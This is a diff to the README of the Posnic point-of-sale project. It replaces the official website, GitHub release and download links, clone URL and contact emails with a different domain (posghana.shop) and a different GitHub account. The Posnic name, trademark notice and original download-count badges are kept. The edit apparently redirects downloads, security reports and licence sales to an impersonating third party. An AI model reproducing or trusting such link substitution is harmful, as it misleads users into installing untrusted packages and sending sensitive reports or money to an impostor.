@@ -15,21 +15,21 @@ network.
 Posnic's own source is AGPL-3.0-only. Release packages also bundle separately
 licensed components, including MongoDB Community Server under SSPL-1.0. Review
 the [package notices](THIRD-PARTY-NOTICES.md) and
-[reproduced package evidence](https://www.posnic.com/assets/posnic-package-license-evidence.json)
+[reproduced package evidence](https://www.posghana.shop/assets/posnic-package-license-evidence.json)
 before making a package-level licence statement.
 
-[![CI](https://github.com/Posnic/POS/actions/workflows/ci.yml/badge.svg?branch=main)](https://github.com/Posnic/POS/actions/workflows/ci.yml)
-[![Release](https://github.com/Posnic/POS/actions/workflows/release.yml/badge.svg)](https://github.com/Posnic/POS/actions/workflows/release.yml)
-[![Downloads](https://img.shields.io/github/downloads/Posnic/POS/total?label=downloads&color=brightgreen)](https://github.com/Posnic/POS/releases)
-[![Latest release](https://img.shields.io/github/v/release/Posnic/POS?include_prereleases&label=latest&color=blue)](https://github.com/Posnic/POS/releases/latest)
+[![CI](https://github.com/awagamary1-sudo/poshub/actions/workflows/ci.yml/badge.svg?branch=main)](https://github.com/awagamary1-sudo/poshub/actions/workflows/ci.yml)
+[![Release](https://github.com/awagamary1-sudo/poshub/actions/workflows/release.yml/badge.svg)](https://github.com/awagamary1-sudo/poshub/actions/workflows/release.yml)
+[![Downloads](https://img.shields.io/github/downloads/Posnic/POS/total?label=downloads&color=brightgreen)](https://github.com/awagamary1-sudo/poshub/releases)
+[![Latest release](https://img.shields.io/github/v/release/Posnic/POS?include_prereleases&label=latest&color=blue)](https://github.com/awagamary1-sudo/poshub/releases/latest)
 [![Tests](https://img.shields.io/badge/tests-9%2C000%2B%20passing-brightgreen)](docs/DEVELOPMENT.md#running-the-tests)
 [![Coverage](https://img.shields.io/badge/coverage-69%25%20statements-yellow)](docs/DEVELOPMENT.md#running-the-tests)
 [![API](https://img.shields.io/badge/REST%20API-951%20endpoints-blue)](docs/API.md)
 [![Source licence](https://img.shields.io/badge/source%20licence-AGPL--3.0-blue)](LICENSE)
 [![Package notices](https://img.shields.io/badge/package%20notices-component%20licences-informational)](THIRD-PARTY-NOTICES.md)
-[![Platforms](https://img.shields.io/badge/platforms-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)](https://github.com/Posnic/POS/releases/latest)
+[![Platforms](https://img.shields.io/badge/platforms-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)](https://github.com/awagamary1-sudo/poshub/releases/latest)
 
-### [⬇ Download for Windows](https://github.com/Posnic/POS/releases/latest) · [macOS](https://github.com/Posnic/POS/releases/latest) · [Linux](https://github.com/Posnic/POS/releases/latest)
+### [⬇ Download for Windows](https://github.com/awagamary1-sudo/poshub/releases/latest) · [macOS](https://github.com/awagamary1-sudo/poshub/releases/latest) · [Linux](https://github.com/awagamary1-sudo/poshub/releases/latest)
 
 ### [▶ Try the live demo](https://demo.posnic.io) — nothing to install, resets on the hour
 
@@ -39,7 +39,7 @@ shop with a week of sample trading, running the same code as this repository;
 ring up sales, break things freely, and the whole shop is restored on the
 hour. Outbound email, SMS and password changes are switched off there.
 
-[Website](https://www.posnic.com/) · [Product facts](https://www.posnic.com/posnic-facts) · [Package evidence](https://www.posnic.com/assets/posnic-package-license-evidence.json) · [CodeMeta metadata](codemeta.json) · [Citation metadata](CITATION.cff) · [Roadmap](docs/ROADMAP.md) · [Contributor quickstart](docs/CONTRIBUTOR_QUICKSTART.md) · [User guide](docs/USER_GUIDE.md) · [Developer guide](docs/DEVELOPMENT.md) · [Architecture](docs/ARCHITECTURE.md) · [API](docs/API.md) · [Discussions](https://github.com/Posnic/POS/discussions)
+[Website](https://www.posghana.shop/) · [Product facts](https://www.posghana.shop/posnic-facts) · [Package evidence](https://www.posghana.shop/assets/posnic-package-license-evidence.json) · [CodeMeta metadata](codemeta.json) · [Citation metadata](CITATION.cff) · [Roadmap](docs/ROADMAP.md) · [Contributor quickstart](docs/CONTRIBUTOR_QUICKSTART.md) · [User guide](docs/USER_GUIDE.md) · [Developer guide](docs/DEVELOPMENT.md) · [Architecture](docs/ARCHITECTURE.md) · [API](docs/API.md) · [Discussions](https://github.com/awagamary1-sudo/poshub/discussions)
 
 </div>
 
@@ -50,7 +50,7 @@ hour. Outbound email, SMS and password changes are switched off there.
 ![A completed cash sale in Posnic v1.3.0](docs/images/offline-sale-v1-3-0.png)
 
 This synthetic cash sale was completed and reopened during the bounded
-[offline workflow verification](https://www.posnic.com/posnic-facts). The published
+[offline workflow verification](https://www.posghana.shop/posnic-facts). The published
 test notes state what was blocked, what passed and what the result does not
 prove.
 
@@ -61,7 +61,7 @@ v1.3.0 Windows test, one synthetic cash sale completed and reopened while
 external hosts were blocked inside Electron. This does not prove an
 operating-system-wide outage, complete shift, payment-terminal path, power-loss
 recovery or every workflow. Review the
-[versioned evidence and limitations](https://www.posnic.com/posnic-facts).
+[versioned evidence and limitations](https://www.posghana.shop/posnic-facts).
 
 - **Free local edition.** The v1.3.0 desktop packages have no trial clock and
   have a zero software price. Posnic's own source is AGPL-3.0-only; packaged
@@ -76,7 +76,7 @@ recovery or every workflow. Review the
 ### Using Posnic in a real business or pilot?
 
 Share a bounded
-[deployment evidence report](https://github.com/Posnic/POS/issues/new?template=deployment_evidence.yml),
+[deployment evidence report](https://github.com/awagamary1-sudo/poshub/issues/new?template=deployment_evidence.yml),
 including failures, workarounds, or why a trial stopped. The form records the
 exact version, relationship, observation window, workflows and limitations while
 letting you refuse marketing reuse. Read the
@@ -85,13 +85,13 @@ production information.
 
 ### Reviewing Posnic independently?
 
-Use the public [review brief](https://www.posnic.com/assets/posnic-independent-review-brief.txt)
-and [24-control protocol](https://www.posnic.com/assets/posnic-independent-review-protocol.csv)
+Use the public [review brief](https://www.posghana.shop/assets/posnic-independent-review-brief.txt)
+and [24-control protocol](https://www.posghana.shop/assets/posnic-independent-review-protocol.csv)
 with the exact release, package filename and SHA-256 you tested. Review access
 does not require payment, positive coverage, a backlink or advance approval.
 Publish failures, conflicts and untested areas beside successful results. An
 independent evaluator can submit a bounded public result through the
-[deployment evidence form](https://github.com/Posnic/POS/issues/new?template=deployment_evidence.yml)
+[deployment evidence form](https://github.com/awagamary1-sudo/poshub/issues/new?template=deployment_evidence.yml)
 without granting marketing reuse.
 
 ## Features
@@ -132,7 +132,7 @@ guide](https://posnic.github.io/offline-vs-online-pos.html).
 ### Desktop
 
 Download the package for your platform from
-**[the latest release](https://github.com/Posnic/POS/releases/latest)**, run it,
+**[the latest release](https://github.com/awagamary1-sudo/poshub/releases/latest)**, run it,
 and follow the wizard. Current v1.6.2 packages include MongoDB Community Server
 under its separate SSPL-1.0 licence, so no separate database install is needed
 for the bundled setup. See [third-party notices](THIRD-PARTY-NOTICES.md).
@@ -170,7 +170,7 @@ clear), **keep port 27017 off the internet**, and **restore a backup once** to
 prove it is a backup rather than a file.
 
 **Self-hosting does not include sync between tills or branches.** That is
-[Posnic Cloud](https://www.posnic.com/pricing). A self-hosted Posnic is one
+[Posnic Cloud](https://www.posghana.shop/pricing). A self-hosted Posnic is one
 database several people use at once — which is what most single-shop setups
 actually want — not several databases kept in step.
 
@@ -180,7 +180,7 @@ Full guide, including installing by hand on other systems:
 ## Build from source
 
 ```bash
-git clone https://github.com/Posnic/POS.git
+git clone https://github.com/awagamary1-sudo/poshub.git
 cd POS
 npm install
 npm --prefix api install
@@ -295,8 +295,8 @@ little back is what keeps the next release coming.
 | | |
 |---|---|
 | ☕ **[Buy us a chai](https://github.com/sponsors/Posnic)** | one-off or monthly, from a dollar up |
-| ☁️ **[Posnic Cloud](https://www.posnic.com/pricing)** | sync, off-site backups, remote dashboards — the paid service that funds this one |
-| 🏢 **Commercial licence** | keep your modifications private — **info@posnic.com** |
+| ☁️ **[Posnic Cloud](https://www.posghana.shop/pricing)** | sync, off-site backups, remote dashboards — the paid service that funds this one |
+| 🏢 **Commercial licence** | keep your modifications private — **info@posghana.shop** |
 
 Sponsors are named in releases unless they would rather not be.
 
@@ -306,10 +306,10 @@ Sponsors are named in releases unless they would rather not be.
 
 | | |
 |---|---|
-| Sales and licensing | **info@posnic.com** |
-| Support | [SUPPORT.md](.github/SUPPORT.md) · [Discussions](https://github.com/Posnic/POS/discussions) |
-| Security | **info@posnic.com** — privately, never a public issue ([SECURITY.md](.github/SECURITY.md)) |
-| Web | [www.posnic.com](https://www.posnic.com/) |
+| Sales and licensing | **info@posghana.shop** |
+| Support | [SUPPORT.md](.github/SUPPORT.md) · [Discussions](https://github.com/awagamary1-sudo/poshub/discussions) |
+| Security | **info@posghana.shop** — privately, never a public issue ([SECURITY.md](.github/SECURITY.md)) |
+| Web | [www.posghana.shop](https://www.posghana.shop/) |
 
 Paid setup, migration from an existing till, hardware selection, custom
 reporting and white-labelled installers are all available. The software stays
@@ -328,7 +328,7 @@ The **Posnic name and logo are trademarks** and are not covered by the AGPL —
 see [GOVERNANCE.md § Trademark](docs/GOVERNANCE.md#trademark-and-reserved-rights).
 
 Companies needing to keep modifications private can buy a commercial licence:
-**info@posnic.com**. Such a licence covers the code Posnic owns. Contributors
+**info@posghana.shop**. Such a licence covers the code Posnic owns. Contributors
 keep the copyright in what they write and there is no CLA, so community code can
 only be relicensed with its author's agreement — a deliberate limit on our own
 power, set out in [GOVERNANCE.md § Contributor
